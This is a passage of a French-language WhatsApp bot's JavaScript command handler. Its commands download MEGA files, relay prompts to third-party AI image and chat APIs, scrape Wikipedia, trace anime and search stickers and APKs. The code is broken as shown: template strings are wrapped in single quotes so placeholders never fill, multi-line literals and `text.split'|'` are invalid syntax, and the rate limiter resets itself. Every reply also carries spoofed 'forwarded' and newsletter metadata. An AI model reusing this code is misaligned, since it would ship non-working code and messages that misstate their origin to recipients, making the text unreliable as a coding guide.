        return await Kev.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
      }
      await Kev.sendMessage(
        m.chat,
        { document: { url: data.dllink }, mimetype: 'application/vnd.android.package-archive', fileName: data.name + '.apk', caption: null },
        { quoted: m }
      )
    }
  } catch {
    return replygckev('*[❗] Une erreur a ete rencontree. Verifiez que votre lien est valide.*');
  }
};
break
case 'mega':{
	try {
if (!text) return replygckev('${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8');
const { File } = require('megajs');
        const file = File.fromURL(text);
        await file.loadAttributes();
        if (file.size >= 300000000) return replygckev('Erreur: le volume du fichier est trop grand (Maximum: 300MB)');
        const downloadingMessage = '🌩️ Fichier Encours de telechargement... Veuillez patienter.';
        replygckev(downloadingMessage);
        const caption = '*_Telechargement reussi..._*\nFichier: ${file.name}\nVolume: ${formatBytes(file.size)}';
        const data = await file.downloadBuffer();
        const fileExtension = path.extname(file.name).toLowerCase();
        const mimeTypes = {
            ".mp4": "video/mp4",
            ".pdf": "application/pdf",
            ".zip": "application/zip",
            ".rar": "application/x-rar-compressed",
            ".7z": "application/x-7z-compressed",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".png": "image/png",
        };
        let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
        await Kev.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
    } catch (error) {
        return replygckev('Erreur: ${error.message}');
    }
}
break
case 'photoleap': {
	if (!text) return replygckev('*• Exemple:* ${prefix + command} mer bleue');
  let currentTime = Date.now();
  let lastUsed = 0;
  if (currentTime - lastUsed < 10000) return replygckev("Veuillez reessayer plus tard");
  lastUsed = currentTime;
  try {
    let gpt = await (await fetch('https://tti.photoleapapp.com/api/v1/generate?prompt=${text}')).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Photo Leap AI\n\n' + text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result_url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"✨\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygckev("'*Erreur*'");
  }
}
break
case 'ia':
case 'openai': {
	if (!text) return replygckev('*• Exemple:* ${prefix + command} pourquoi tonton Kev aime tant les femmes? ');   
        try {
let gpt = await (await fetch('https://itzpire.com/ai/gpt?model=gpt-4&q=${text}')).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Chat GPT\n\n' + gpt.data.response
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("'*Erreur*'")
}
}
    break
        case 'animate': {
	if (!text) return replygckev('*• Exemple:* ${prefix + command} chat vs souris');   
        try {
let gpt = await (await fetch('https://itzpire.com/ai/animate-diff?prompt=${text}')).json()
const response = await axios.get(gpt.data.image_urls, { responseType: 'arraybuffer' })
const buffer = Buffer.from(response.data, "utf-8")
var fetchedgif = await GIFBufferToVideoBuffer(buffer)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Animation AI\n\n_*Voici le resultat de: ${text}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: fetchedgif }, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice 👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("'*Erreur*'")
}
}
    break
        case 'diffusion_anime': {
	if (!text) return replygckev('*• Exemple:* ${prefix + command} en quoi Messi est le meilleur?');   
        try {
let gpt = await (await fetch('https://itzpire.com/ai/animediff2?prompt=${text}')).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Diffusion Anime AI\n\n_*Voici le resultat de: ${text}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: gpt.result} }, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice 👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("'*Erreur*'")
}
}
    break
    case 'assistant_voyage': {
	if (!text) return replygckev('*• Exemple:* ${prefix + command} Comment puis-je visiter le cameroun?');   
        try {
let gpt = await (await fetch('https://itzpire.com/ai/copilot2trip?q=${text}')).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Travel Assistant AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice 👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("'*Erreur*'")
}
}
    break
    case 'dalle': {
	if (!text) return replygckev('*• Exemple:* ${prefix + command} Sophia ecrit sur une plage');   
        try {
let gpt = await (await fetch('https://itzpire.com/ai/dalle?prompt=${text}')).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Dalle\n\n_*Voici le resultat de: ${text}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice 👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("'*Erreur*'")
}
}
    break
    case 'guru_ai': {
	if (!text) return replygckev('*• Exemple:* ${prefix + command} how to make girl pregnant');   
        try {
let gpt = await (await fetch('https://itzpire.com/ai/degreeGuru?q=${text}')).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Guru AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice 👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("'*Erreur*'")
}
}
    break
    case 'emi_ai': {
	if (!text) return replygckev('*• Exemple:* ${prefix + command} A Girl Singing In Public');   
        try {
let gpt = await (await fetch('https://itzpire.com/ai/emi?prompt=${text}')).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Emi AI\n\n_*Voici le resultat de: ${text}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice 👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("'*Erreur*'")
}
}
    break
    case 'costume_ai': {
	if (!text) return replygckev('*• Exemple:* ${prefix + command} how to make girl pregnant');   
        try {
let gpt = await (await fetch('https://itzpire.com/ai/gpt-logic?q=${text}&logic=${text}&realtime=true')).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Costume AI\n\n${gpt.data.response}'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice 👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("'*Erreur*'")
}
}
    break
    case 'herc_ai': {
	if (!text) return replygckev('*• Exemple:* ${prefix + command} how to make girl pregnant');   
        try {
let gpt = await (await fetch('https://itzpire.com/ai/hercai-chat?model=v3&q=${text}')).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Herc AI\n\n${gpt.result.response}'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice 👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("'*Erreur*'")
}
}
    break
    case 'hercaiv1': {
	if (!text) return replygckev('*• Exemple:* ${prefix + command} a girl singing in public');   
        try {
let gpt = await (await fetch('https://itzpire.com/ai/hercai-img?model=v1&prompt=${text}')).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Herc AI V1\n\n_*Voici le resultat de: ${text}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice 👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("'*Erreur*'")
}
}
    break
    case 'realiste': case '3d_model': {
    	if (!text) return replygckev('*Exemple:* ${prefix + command} blue sky')
  let currentTime = Date.now();
  if (currentTime - lastUsed < 10000) return replygckev("Veuillez reessayer plus tard")
  lastUsed = currentTime;
  try {
    let negative = 'ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers, adult, naked, 18+';
    let gpt = await (await fetch('https://itzpire.com/ai/${command}?prompt=${text}')).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> ${command} AI\n\n_*Voici le resultat de: ${text}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Nice 👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygckev("'GPT ne repond pas'")
  }
}
break
case 'wikipedia': case 'wiki': {
	if (!text) return replygckev('Veuillez entrer votre recherche')
	
    try {
	const link =  await axios.get('https://en.wikipedia.org/wiki/${text}')
	const $ = cheerio.load(link.data)
	let wik = $('#firstHeading').text().trim()
	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '▢ *Wikipedia*

‣ Titre : ${wik}

${resulw}'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  replygckev('⚠️ resultat introuvable ')
}
}
break
case 'trace_anime': {
	try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || "";
    if (!mime.startsWith('image')) {
      return replygckev("*Veuillez repondre a une image*");
    }
    let data = await q.download();
    let image = await uploadImage(data);
    let apiUrl = 'https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}';
    console.log("API URL:", apiUrl);
    let response = await fetch(apiUrl);
    let result = await response.json();
    console.log("API Response:", result);
    if (!result || result.error || result.result.length === 0) {
      return replygckev("*Erreur: impossible de tracer cet anime.*");
    }
    let { anilist, from, to, similarity, video, episode } = result.result[0];
    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
    let message = '*Anime:* ${animeTitle}\n';
    if (anilist.synonyms && anilist.synonyms.length > 0) {
      message += '*Synonyms:* ${anilist.synonyms.join(", ")}\n';
    }
    message += '*Similitude :* ${similarity.toFixed(2)}%\n';
    message += '*Temps:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n';
    if (episode) {
      message += '*Episode:* ${episode}\n';
    }
    console.log("Anime Information:", {
      animeTitle,
      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
      similarity,
      timestamp: '${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}',
      video,
      episode,
    });
    // Send the video with anime information as the caption
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url: video}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error("Error:", error);
    replygckev("*Erreur: nous rencontrons des difficulteys a tracer cet anime.*");
  }
};
break
case 'recherche_sticker': {
if (!text) return replygckev('Exemple : ${m.prefix + command} Luffy')
var js = await fetch('https://dikaardnt.com/api/search/sticker?q=${q}')
var json = await js.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '
❗ Note : Le bot donnera un resultat aleatoir. si le resultat est different de vos attentes , essayez a nouveau ${prefix + command} ${text}

💼 Titre : ${json[0].title}
🔗 Lien : ${json[0].url}
⭐ Total : ${json[0].total}
'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'recherche_apk': {
if (!text) return replygckev('Exemple : ${prefix + command} whatsapp')
var js = await fetch('https://dikaardnt.com/api/search/apk?q=${q}')
var json = await js.json()
var capt = '
❗ Note : Le bot donnera un resultat aleatoir. si le resultat est different de vos attentes , essayez a nouveau ${prefix + command} ${text}
    
💼 Titre : ${json[0].package}
🔗 Lien : ${json[0].url}
👤 Developpeur : ${json[0].developer}
⭐ Rating : ${json[0].rating}
';
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: capt
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: json[0].thumbnail }}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"👀\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'voir_plus': {
	let [l, r] = text.split'|'
    if (!l) l = ''
    if (!r) r = ''
    Kev.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
  case 'total_option':
        case 'total_commande': 
        case 'totalcmd': 
        case 'totalcommand': 
            replygckev('le nombre total de comandes de ${botname} est ${kevfeature()}')
        break
                    case 'menu':
            case 'sylvers': {
            let ownernya = ownernumber + '@s.whatsapp.net'
            let timestampe = speed()
            let latensie = speed() - timestampe
            let a = db.data.users[sender]
            let me = m.sender
            let kmenu_oh2 = '┌─❖
│ Hey 👋 
└┬❖  ${pushname} 
┌┤✑  ${kevinoutimewisher} 😄${readmore} 
│└────────────┈ ⳹
│
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊 
│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
│𝗕𝗼𝘁 : ${botname}
│𝗢𝘄𝗻𝗲𝗿 𝗡𝗼: +${ownernumber}
│𝗣??𝗲𝗳𝗶𝘅 :  [ ${kprefix} ]
│𝗠𝗼𝗱𝗲 : ${Kev.public ? 'Public' : 'Self'}
│𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length} User
│𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 : ${global.db.data.settings[botNumber].totalhit} Hit
│𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝘁 : ${Object.keys(global.db.data.chats).length} Chat/Gc
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊
│𝗡𝗮𝗺𝗲 : ${pushname}
│𝗡𝘂𝗺𝗯𝗲𝗿 : +${me.split('@')[0]}
│𝗟𝗶𝗺𝗶𝘁 : ${a.limit}
│𝗧𝗶𝘁𝗹𝗲 : ${a.title ? a.title : '-'}
│𝗦𝗲𝗿𝗶𝗮𝗹: ${a.serialNumber}
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝗧𝗶𝗺𝗲 : ${ktime}
│𝗗𝗮𝘁𝗲 : ${kdate}
└┬───────────────── ⳹
   │✑  Veuillez cliquer sur *MENU 🌺*
   │✑  Given *BELOW*
   └─────────────┈ ⳹'
            let kmenu_oh = '┌─❖
│ Hey 👋 
└┬❖  ${pushname} 
┌┤✑  ${kevinoutimewisher} 😄${readmore} 
│└────────────┈ ⳹
│
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊 
│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
│𝗕𝗼𝘁 : ${botname}
│𝗢𝘄𝗻𝗲𝗿 𝗡𝗼: +${ownernumber}
│𝗣𝗿𝗲𝗳𝗶𝘅 :  [ ${kprefix} ]
│𝗠𝗼𝗱𝗲 : ${Kev.public ? 'Public' : 'Self'}
│𝗛𝗼𝘀?? 𝗡𝗮𝗺𝗲 : ${os.hostname()}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
